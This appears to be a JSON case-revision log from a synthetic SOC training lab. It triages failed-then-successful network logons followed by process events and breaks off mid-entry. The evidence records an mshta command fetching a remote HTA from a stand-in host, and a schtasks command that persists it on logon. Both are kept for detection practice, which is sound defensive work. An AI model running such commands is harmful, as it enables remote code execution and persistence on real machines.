[{"payload":{"action":"create","actor":"demo-analyst","at":"2026-10-04T15:26:09.502182+00:00","case_id":"cb9fe31a1d974805b59694f462ec2be7","rationale":"Portfolio workflow exercise generated from synthetic case 005. Five failed network logons precede a matching success. The process and task sequence needs review; this is not an incident on the host running the project.","sequence":1,"snapshot":{"created_at":"2026-10-04T15:26:09.502182+00:00","evidence":[{"event_uid":"f4306533550f55d80cf9878e653b252eae2a2cc0dd71233f2fcebd92be932be3","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":100,"timestamp":"2026-09-03T10:00:00Z"},"source_line":1,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"34708f039f64e9944eb390107df937531d3e285273375912e02b0269da147a2a","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":101,"timestamp":"2026-09-03T10:00:01Z"},"source_line":2,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"f6885debff92028f9dd4d36fc2ed0cc080af499f6031bc01d5cf0cb7673d51ed","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":102,"timestamp":"2026-09-03T10:00:02Z"},"source_line":3,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"adcb4a75e805e21d7cf57b3bf5aa50b06f592d174ea00c74e091138ff2b6a1b4","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":103,"timestamp":"2026-09-03T10:00:03Z"},"source_line":4,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"d9ea1507c860ebcb6c49e86da3543f23477c6b9dced71e5585efee17c16ea3d7","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":104,"timestamp":"2026-09-03T10:00:04Z"},"source_line":5,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"0b9366e7aa994aac453e2a2878d70f8c6853fc4baae7f37d0934c15fe516edd3","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonGuid":"{9e175872-74a3-5c6d-882c-524c742cb7dc}","LogonType":"3","TargetDomainName":"LAB","TargetLogonId":"0x42","TargetUserName":"analyst.lab"},"event_id":4624,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":105,"timestamp":"2026-09-03T10:00:05Z"},"source_line":6,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"8cf28a0658eecb79c373fdb509d45407ab1d4c461a3af6653d012608910c341c","original":{"channel":"Microsoft-Windows-Sysmon/Operational","event_data":{"CommandLine":"mshta.exe https://payload.example.invalid/stage.hta","Image":"C:\\Windows\\System32\\mshta.exe","LogonGuid":"{9e175872-74a3-5c6d-882c-524c742cb7dc}","LogonId":"0x42","ParentProcessGuid":"{ac333bb9-aa2e-5082-938a-2c0dee8262a1}","ProcessGuid":"{f778258b-2409-596c-9c79-f0ab1770249d}","ProcessId":"4001","User":"LAB\\analyst.lab"},"event_id":1,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Sysmon","record_id":107,"timestamp":"2026-09-03T10:00:07Z"},"source_line":2,"source_sha256":"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d"},{"event_uid":"bc9eaff475de5e378939be8e751f5fc65e3c9c0fc61030fd810b0edbe9b59ce9","original":{"channel":"Microsoft-Windows-Sysmon/Operational","event_data":{"DestinationIp":"198.51.100.20","DestinationPort":"443","Image":"C:\\Windows\\System32\\mshta.exe","Initiated":"true","ProcessGuid":"{f778258b-2409-596c-9c79-f0ab1770249d}","Protocol":"tcp"},"event_id":3,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Sysmon","record_id":108,"timestamp":"2026-09-03T10:00:08Z"},"source_line":3,"source_sha256":"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d"},{"event_uid":"42ae87bb3476153ff7f2257ac8949922b6f02b1d20cb7f6b2885ae35c7000fb1","original":{"channel":"Microsoft-Windows-Sysmon/Operational","event_data":{"CommandLine":"schtasks.exe /Create /SC ONLOGON /TN LabUpdater /TR \"mshta.exe https://payload.example.invalid/stage.hta\"","Image":"C:\\Windows\\System32\\schtasks.exe","LogonGuid":"{9e175872-74a3-5c6d-882c-524c742cb7dc}","LogonId":"0x42","ParentProcessGuid":"{f778258b-2409-596c-9c79-f0ab1770249d}","ProcessGuid":"{582945ac-4be3-5081-ab8d-39ed62d01823}","ProcessId":"4002","User":"LAB\\analyst.lab"},"event_id":1,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Sysmon","record_id":109,"timestamp":"2026-09-03T10:00:09Z"},"source_line":4,"source_sha256":"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d"}],"id":"cb9fe31a1d974805b59694f462ec2be7","revision":1,"severity":"high","source_case":"case-005","status":"new","title":"Constructed case: network logon followed by mshta and task creation","updated_at":"2026-10-04T15:26:09.502182+00:00","verdict":null}},"previous_sha256":"0000000000000000000000000000000000000000000000000000000000000000","sha256":"bc3a3c3ca32b3514c8284285daa3e47ac34f1459d3806654fa4957daeee66bb5"},{"payload":{"action":"transition","actor":"demo-analyst","at":"2026-10-04T15:26:09.555637+00:00","case_id":"cb9fe31a1d974805b59694f462ec2be7","rationale":"High-priority review within the lab: source scope is approved, and account/domain/IP/logon type match. The successful logon alone does not attribute the initiating person or establish malicious intent.","sequence":2,"snapshot":{"created_at":"2026-10-04T15:26:09.502182+00:00","evidence":[{"event_uid":"f4306533550f55d80cf9878e653b252eae2a2cc0dd71233f2fcebd92be932be3","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":100,"timestamp":"2026-09-03T10:00:00Z"},"source_line":1,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"34708f039f64e9944eb390107df937531d3e285273375912e02b0269da147a2a","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":101,"timestamp":"2026-09-03T10:00:01Z"},"source_line":2,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"f6885debff92028f9dd4d36fc2ed0cc080af499f6031bc01d5cf0cb7673d51ed","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":102,"timestamp":"2026-09-03T10:00:02Z"},"source_line":3,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"adcb4a75e805e21d7cf57b3bf5aa50b06f592d174ea00c74e091138ff2b6a1b4","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":103,"timestamp":"2026-09-03T10:00:03Z"},"source_line":4,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"d9ea1507c860ebcb6c49e86da3543f23477c6b9dced71e5585efee17c16ea3d7","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":104,"timestamp":"2026-09-03T10:00:04Z"},"source_line":5,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"0b9366e7aa994aac453e2a2878d70f8c6853fc4baae7f37d0934c15fe516edd3","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonGuid":"{9e175872-74a3-5c6d-882c-524c742cb7dc}","LogonType":"3","TargetDomainName":"LAB","TargetLogonId":"0x42","TargetUserName":"analyst.lab"},"event_id":4624,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":105,"timestamp":"2026-09-03T10:00:05Z"},"source_line":6,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"8cf28a0658eecb79c373fdb509d45407ab1d4c461a3af6653d012608910c341c","original":{"channel":"Microsoft-Windows-Sysmon/Operational","event_data":{"CommandLine":"mshta.exe https://payload.example.invalid/stage.hta","Image":"C:\\Windows\\System32\\mshta.exe","LogonGuid":"{9e175872-74a3-5c6d-882c-524c742cb7dc}","LogonId":"0x42","ParentProcessGuid":"{ac333bb9-aa2e-5082-938a-2c0dee8262a1}","ProcessGuid":"{f778258b-2409-596c-9c79-f0ab1770249d}","ProcessId":"4001","User":"LAB\\analyst.lab"},"event_id":1,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Sysmon","record_id":107,"timestamp":"2026-09-03T10:00:07Z"},"source_line":2,"source_sha256":"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d"},{"event_uid":"bc9eaff475de5e378939be8e751f5fc65e3c9c0fc61030fd810b0edbe9b59ce9","original":{"channel":"Microsoft-Windows-Sysmon/Operational","event_data":{"DestinationIp":"198.51.100.20","DestinationPort":"443","Image":"C:\\Windows\\System32\\mshta.exe","Initiated":"true","ProcessGuid":"{f778258b-2409-596c-9c79-f0ab1770249d}","Protocol":"tcp"},"event_id":3,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Sysmon","record_id":108,"timestamp":"2026-09-03T10:00:08Z"},"source_line":3,"source_sha256":"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d"},{"event_uid":"42ae87bb3476153ff7f2257ac8949922b6f02b1d20cb7f6b2885ae35c7000fb1","original":{"channel":"Microsoft-Windows-Sysmon/Operational","event_data":{"CommandLine":"schtasks.exe /Create /SC ONLOGON /TN LabUpdater /TR \"mshta.exe https://payload.example.invalid/stage.hta\"","Image":"C:\\Windows\\System32\\schtasks.exe","LogonGuid":"{9e175872-74a3-5c6d-882c-524c742cb7dc}","LogonId":"0x42","ParentProcessGuid":"{f778258b-2409-596c-9c79-f0ab1770249d}","ProcessGuid":"{582945ac-4be3-5081-ab8d-39ed62d01823}","ProcessId":"4002","User":"LAB\\analyst.lab"},"event_id":1,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Sysmon","record_id":109,"timestamp":"2026-09-03T10:00:09Z"},"source_line":4,"source_sha256":"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d"}],"id":"cb9fe31a1d974805b59694f462ec2be7","revision":2,"severity":"high","source_case":"case-005","status":"triaged","title":"Constructed case: network logon followed by mshta and task creation","updated_at":"2026-10-04T15:26:09.555637+00:00","verdict":null}},"previous_sha256":"bc3a3c3ca32b3514c8284285daa3e47ac34f1459d3806654fa4957daeee66bb5","sha256":"6e46e36ef02eea564f4219340a9a1200d948e13dbb5c2600fc3bc544c667519a"},{"payload":{"action":"transition","actor":"demo-analyst","at":"2026-10-04T15:26:09.573287+00:00","case_id":"cb9fe31a1d974805b59694f462ec2be7","rationale":"Confirmed observed links: a nonzero LogonGuid, host and domain-qualified user connect the logon to mshta; ProcessGuid connects the initiated network record; an observed parent edge reaches schtasks /Create /TR. Destination 198.51.100.20 and payload.example.invalid are lab markers, not threat-intelligence verdicts.","sequence":3,"snapshot":{"created_at":"2026-10-04T15:26:09.502182+00:00","evidence":[{"event_uid":"f4306533550f55d80cf9878e653b252eae2a2cc0dd71233f2fcebd92be932be3","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":100,"timestamp":"2026-09-03T10:00:00Z"},"source_line":1,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"34708f039f64e9944eb390107df937531d3e285273375912e02b0269da147a2a","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":101,"timestamp":"2026-09-03T10:00:01Z"},"source_line":2,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"f6885debff92028f9dd4d36fc2ed0cc080af499f6031bc01d5cf0cb7673d51ed","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":102,"timestamp":"2026-09-03T10:00:02Z"},"source_line":3,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"adcb4a75e805e21d7cf57b3bf5aa50b06f592d174ea00c74e091138ff2b6a1b4","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":103,"timestamp":"2026-09-03T10:00:03Z"},"source_line":4,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"d9ea1507c860ebcb6c49e86da3543f23477c6b9dced71e5585efee17c16ea3d7","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":104,"timestamp":"2026-09-03T10:00:04Z"},"source_line":5,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"0b9366e7aa994aac453e2a2878d70f8c6853fc4baae7f37d0934c15fe516edd3","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonGuid":"{9e175872-74a3-5c6d-882c-524c742cb7dc}","LogonType":"3","TargetDomainName":"LAB","TargetLogonId":"0x42","TargetUserName":"analyst.lab"},"event_id":4624,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":105,"timestamp":"2026-09-03T10:00:05Z"},"source_line":6,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"8cf28a0658eecb79c373fdb509d45407ab1d4c461a3af6653d012608910c341c","original":{"channel":"Microsoft-Windows-Sysmon/Operational","event_data":{"CommandLine":"mshta.exe https://payload.example.invalid/stage.hta","Image":"C:\\Windows\\System32\\mshta.exe","LogonGuid":"{9e175872-74a3-5c6d-882c-524c742cb7dc}","LogonId":"0x42","ParentProcessGuid":"{ac333bb9-aa2e-5082-938a-2c0dee8262a1}","ProcessGuid":"{f778258b-2409-596c-9c79-f0ab1770249d}","ProcessId":"4001","User":"LAB\\analyst.lab"},"event_id":1,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Sysmon","record_id":107,"timestamp":"2026-09-03T10:00:07Z"},"source_line":2,"source_sha256":"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d"},{"event_uid":"bc9eaff475de5e378939be8e751f5fc65e3c9c0fc61030fd810b0edbe9b59ce9","original":{"channel":"Microsoft-Windows-Sysmon/Operational","event_data":{"DestinationIp":"198.51.100.20","DestinationPort":"443","Image":"C:\\Windows\\System32\\mshta.exe","Initiated":"true","ProcessGuid":"{f778258b-2409-596c-9c79-f0ab1770249d}","Protocol":"tcp"},"event_id":3,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Sysmon","record_id":108,"timestamp":"2026-09-03T10:00:08Z"},"source_line":3,"source_sha256":"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d"},{"event_uid":"42ae87bb3476153ff7f2257ac8949922b6f02b1d20cb7f6b2885ae35c7000fb1","original":{"channel":"Microsoft-Windows-Sysmon/Operational","event_data":{"CommandLine":"schtasks.exe /Create /SC ONLOGON /TN LabUpdater /TR \"mshta.exe https://payload.example.invalid/stage.hta\"","Image":"C:\\Windows\\System32\\schtasks.exe","LogonGuid":"{9e175872-74a3-5c6d-882c-524c742cb7dc}","LogonId":"0x42","ParentProcessGuid":"{f778258b-2409-596c-9c79-f0ab1770249d}","ProcessGuid":"{582945ac-4be3-5081-ab8d-39ed62d01823}","ProcessId":"4002","User":"LAB\\analyst.lab"},"event_id":1,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Sysmon","record_id":109,"timestamp":"2026-09-03T10:00:09Z"},"source_line":4,"source_sha256":"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d"}],"id":"cb9fe31a1d974805b59694f462ec2be7","revision":3,"severity":"high","source_case":"case-005","status":"investigating","title":"Constructed case: network logon followed by mshta and task creation","updated_at":"2026-10-04T15:26:09.573287+00:00","verdict":null}},"previous_sha256":"6e46e36ef02eea564f4219340a9a1200d948e13dbb5c2600fc3bc544c667519a","sha256":"0c31096888926498a622451a433835a0c550d67e299fcb37b629a5b29cf3e92d"},{"payload":{"action":"transition","actor":"demo-analyst","at":"2026-10-04T15:26:09.594817+00:00","case_id":"cb9fe31a1d974805b59694f462ec2be7","rationale":"Escalation draft: review the registered task XML and request task execution history, process termination, payload file/hash and endpoint/network evidence. The collection includes Security 4698 but does not prove task execution or payload behavior. Proposed containment would require authorization and stronger context; no containment action was performed.","sequence":4,"snapshot":{"created_at":"2026-10-04T15:26:09.502182+00:00","evidence":[{"event_uid":"f4306533550f55d80cf9878e653b252eae2a2cc0dd71233f2fcebd92be932be3","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":100,"timestamp":"2026-09-03T10:00:00Z"},"source_line":1,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"34708f039f64e9944eb390107df937531d3e285273375912e02b0269da147a2a","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":101,"timestamp":"2026-09-03T10:00:01Z"},"source_line":2,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"f6885debff92028f9dd4d36fc2ed0cc080af499f6031bc01d5cf0cb7673d51ed","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":102,"timestamp":"2026-09-03T10:00:02Z"},"source_line":3,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"adcb4a75e805e21d7cf57b3bf5aa50b06f592d174ea00c74e091138ff2b6a1b4","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":103,"timestamp":"2026-09-03T10:00:03Z"},"source_line":4,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"d9ea1507c860ebcb6c49e86da3543f23477c6b9dced71e5585efee17c16ea3d7","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonType":"3","Status":"0xc000006d","SubStatus":"0xc000006a","TargetDomainName":"LAB","TargetUserName":"analyst.lab"},"event_id":4625,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":104,"timestamp":"2026-09-03T10:00:04Z"},"source_line":5,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"0b9366e7aa994aac453e2a2878d70f8c6853fc4baae7f37d0934c15fe516edd3","original":{"channel":"Security","event_data":{"IpAddress":"192.0.2.20","LogonGuid":"{9e175872-74a3-5c6d-882c-524c742cb7dc}","LogonType":"3","TargetDomainName":"LAB","TargetLogonId":"0x42","TargetUserName":"analyst.lab"},"event_id":4624,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Security-Auditing","record_id":105,"timestamp":"2026-09-03T10:00:05Z"},"source_line":6,"source_sha256":"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53"},{"event_uid":"8cf28a0658eecb79c373fdb509d45407ab1d4c461a3af6653d012608910c341c","original":{"channel":"Microsoft-Windows-Sysmon/Operational","event_data":{"CommandLine":"mshta.exe https://payload.example.invalid/stage.hta","Image":"C:\\Windows\\System32\\mshta.exe","LogonGuid":"{9e175872-74a3-5c6d-882c-524c742cb7dc}","LogonId":"0x42","ParentProcessGuid":"{ac333bb9-aa2e-5082-938a-2c0dee8262a1}","ProcessGuid":"{f778258b-2409-596c-9c79-f0ab1770249d}","ProcessId":"4001","User":"LAB\\analyst.lab"},"event_id":1,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Sysmon","record_id":107,"timestamp":"2026-09-03T10:00:07Z"},"source_line":2,"source_sha256":"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d"},{"event_uid":"bc9eaff475de5e378939be8e751f5fc65e3c9c0fc61030fd810b0edbe9b59ce9","original":{"channel":"Microsoft-Windows-Sysmon/Operational","event_data":{"DestinationIp":"198.51.100.20","DestinationPort":"443","Image":"C:\\Windows\\System32\\mshta.exe","Initiated":"true","ProcessGuid":"{f778258b-2409-596c-9c79-f0ab1770249d}","Protocol":"tcp"},"event_id":3,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Sysmon","record_id":108,"timestamp":"2026-09-03T10:00:08Z"},"source_line":3,"source_sha256":"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d"},{"event_uid":"42ae87bb3476153ff7f2257ac8949922b6f02b1d20cb7f6b2885ae35c7000fb1","original":{"channel":"Microsoft-Windows-Sysmon/Operational","event_data":{"CommandLine":"schtasks.exe /Create /SC ONLOGON /TN LabUpdater /TR \"mshta.exe https://payload.example.invalid/stage.hta\"","Image":"C:\\Windows\\System32\\schtasks.exe","LogonGuid":"{9e175872-74a3-5c6d-882c-524c742cb7dc}","LogonId":"0x42","ParentProcessGuid":"{f778258b-2409-596c-9c79-f0ab1770249d}","ProcessGuid":"{582945ac-4be3-5081-ab8d-39ed62d01823}","ProcessId":"4002","User":"LAB\\analyst.lab"},"event_id":1,"host":"WS-CHAIN-LAB","provenance":{"generator":"soclab.corpus.sample_events; no commands executed","kind":"synthetic"},"provider":"Microsoft-Windows-Sysmon","record_id":109,"timestamp":"2026-09-03T10:00:09Z"},"source_line":4,"source_sha256":"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d"}],"id":"cb9fe31a1d974805b59694f462ec2be7","revision":4,"severity":"high","source_case":"case-005","status":"escalated","title":"Constructed case: network logon followed by mshta and task creation","updated_at":"2026-10-04T15:26:09.594817+00:00","verdict":null}},"previous_sha256":"0c31096888926498a622451a433835a0c550d67e299fcb37b629a5b29cf3e92d","sha256":"da8f73bb82f4c89f25bc2f93f0c1c397058754eee5d76ba3b769a26b95bcfd66"},{"payload":{"action":"attach","actor":"demo-ui-validator","at":"2026-10-04T15:29:43.709552+00:00","case_id":"cb9fe31a1d974805b59694f462ec2be7","rationale":"Additional evidence attached through the local workspace: Security 4698 record 110 supports task registration as recorded in the synthetic collection. This closes the registration evidence gap in the exported packet. Task execution and payload behavior remain unproven; request task execution history and endpoint evidence before a live incident 